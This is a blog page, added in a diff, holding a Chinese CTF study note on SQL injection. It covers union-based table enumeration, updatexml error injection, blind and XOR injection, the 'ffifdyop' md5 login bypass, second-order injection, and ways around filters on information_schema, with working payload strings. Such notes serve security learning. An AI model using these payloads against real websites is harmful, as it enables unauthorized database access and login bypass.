@@ -1,0 +1,575 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="sql注入相关方法/问题">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>sql-ways - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sql-ways">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-24 13:28" pubdate>
+        2021年7月24日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      847 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sql-ways</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：4 个月前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>sql注入相关方法/问题</p>
+<span id="more"></span>
+<h1 id="sql注入方式"><a href="#sql注入方式" class="headerlink" title="sql注入方式"></a>sql注入方式</h1><h1 id="常规手注"><a href="#常规手注" class="headerlink" title="常规手注"></a>常规手注</h1><p>所用库：<br>information_schema    </p>
+<p>information_schema   数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。<br>information_schema  保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p>
+<p>所用表：<br>information_schema.tables<br>information_schema.columns</p>
+<p>所用字段：  （查询//数据源）<br>information_schema.tables  –&gt; table_name // table_schema</p>
+<p>information_schema.columns  –&gt; column_name // table_name</p>
+<div class="hljs code-wrapper"><pre><code>1.确认注入点
+union select 1,2,3;#
+
+2.查库
+union select 1,2,group_concat(database())#
+
+3.查表
+union select 1,2,group_concat(table_name) 
+from information_schema.tables 
+where table_schema=database()#
+
+4.查列
+union select 1,2,group_concat(column_name) 
+from information_schmea.columns
+where table_name=()#
+
+5.查字段
+union select 1,2,group_concat()
+from ()#
+</code></pre></div>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><img src="/2021/07/24/sql-ways/updatexml.png" srcset="/img/loading.gif" lazyload> </p>
+<p>注入姿势：</p>
+<div class="hljs code-wrapper"><pre><code>updatexml(1,concat(0x7e,(select语句),0x7e),1)
+</code></pre></div>
+<p>详见 buu-1mark [极客大挑战 2019]HardSQL  </p>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><strong>原理/核心：<br>存在T/F可区分的回显，对所需要的每一个字符进行T/F判断</strong>  </p>
+<p>所使用的函数：  </p>
+<p>取字符： <strong>substr</strong>///</p>
+<p>进行判断： <strong>ascii</strong>///<strong>char</strong>///<strong>ord</strong></p>
+<p>基本语句：  </p>
+<p>select</p>
+<p>substr((select),{},1)</p>
+<p>ascii(substr((select),{},1))={}</p>
+<h1 id="异或-注入"><a href="#异或-注入" class="headerlink" title="异或^注入"></a>异或^注入</h1><div class="hljs code-wrapper"><pre><code>0^0=0
+1^1=0
+0^1=1
+1^0=1
+//相同为0，不同为1
+</code></pre></div>
+<p><strong>例：[极客大挑战 2019]FinalSQL</strong></p>
+<h1 id="md5-ffifdyop"><a href="#md5-ffifdyop" class="headerlink" title="md5()  ffifdyop"></a>md5()  ffifdyop</h1><div class="hljs code-wrapper"><pre><code>$sql= &quot;SELECT * FROM admin WHERE pass = &#39;&quot;.md5($password,true).&quot; &#39; &quot;
+
+思路比较明确，当md5后的hex转换成字符串后，如果包含&#39;or&#39;这样的字符串，那整个sql变成
+
+SELECT * FROM admin WHEREpass=&#39;&#39;or&#39;6&#39;
+
+///---&gt;ffifdyop
+
+md5后，276f722736c95d99e921722cf9ed621c
+
+再转成字符串：&#39;or&#39;6
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://err0r.top/article/md5/?highlight=md5">附上一篇err0r师傅的md5比较：https://err0r.top/article/md5/?highlight=md5</a> </p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79045069">https://blog.csdn.net/kuiguowei/article/details/79045069</a></p>
+<p>**原理：  **<br>后端语句对用户输入的数据进行严格的过滤<br>但对于从数据库中的搜索，提取的数据不进行过滤、判断<br>直接使用、代入数据库语句中使用<br>造成sql注入威胁  </p>
+<p><strong>操作步骤：</strong><br>1.将恶意数据插入数据库<br>2.调用恶意数据/使恶意数据在sql语句中起到非预期作用<br>3.回显/根据回显数据调整恶意数据的编写  </p>
+<p><strong>常见类型：</strong><br>注册-登录<br>添加某种数据类型-显示/展示详情    </p>
+<p><strong>例：</strong><br><strong>[SWPU2019]Web1</strong>  </p>
+<h2 id="mysql数据库对转义字符-的存储"><a href="#mysql数据库对转义字符-的存储" class="headerlink" title="mysql数据库对转义字符\的存储"></a>mysql数据库对转义字符\的存储</h2><p>后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义</p>
+<p>经过函数转义后转义字符前+<br>但在数据库存储时存储原字符<br>（如用户输入#，经过函数处理的字符串-&gt;#,插入数据库中的数据仍为#）</p>
+<p>mysql数据库对于\的存储自动-1<br>即：\-&gt;,-&gt;null</p>
+<p><img src="/2021/07/24/sql-ways/escape-string.png" srcset="/img/loading.gif" lazyload>   </p>
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
+<div class="hljs code-wrapper"><pre><code>//共有1,2,3三列数据
+//用1,2,3 代替列名输出
+select 1,2,3 union select * from table_name;
+
+//查询第三列的数据
+select group_concat(b) from(select 1,2,3 as b union select * from table_name)m;
+//或者不用别名
+select `3` from(select 1,2,3 union select * from table_name)m;
+</code></pre></div>
+<p><img src="/2021/07/24/sql-ways/nocolumn-1.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="/2021/07/24/sql-ways/nocolumn-2.png" srcset="/img/loading.gif" lazyload> </p>
+<p><strong>例：[SWPU2019]Web1</strong></p>
+<h1 id="or-information-schema的过滤绕过"><a href="#or-information-schema的过滤绕过" class="headerlink" title="or/information_schema的过滤绕过"></a>or/information_schema的过滤绕过</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49835838/article/details/109159839">https://blog.csdn.net/m0_49835838/article/details/109159839</a></p>
+<h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>该视图的作用简单来说就是用来对表自增ID的监控。<br><img src="/2021/07/24/sql-ways/or-1.png" srcset="/img/loading.gif" lazyload>  </p>
+<h2 id="schema-table-statistics-with-buffer-x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer-x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</h2><p>里面存储着所有数据库所有表的统计信息<br><img src="/2021/07/24/sql-ways/or-2.png" srcset="/img/loading.gif" lazyload>  </p>
+<h2 id="mysql默认存储引擎innoDB携带的表"><a href="#mysql默认存储引擎innoDB携带的表" class="headerlink" title="mysql默认存储引擎innoDB携带的表"></a>mysql默认存储引擎innoDB携带的表</h2><p>mysql.innodb_table_stats  </p>
+<p>mysql.innodb_index_stats  </p>
+<p>两表均有database_name和table_name字段，可以利用  </p>
+<p><img src="/2021/07/24/sql-ways/or-3.png" srcset="/img/loading.gif" lazyload> 
+    </p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-sql/">web sql</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/21/BUU/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUU</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/19/BUU-sql/">
+                        <span class="hidden-mobile">BUU-sql</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
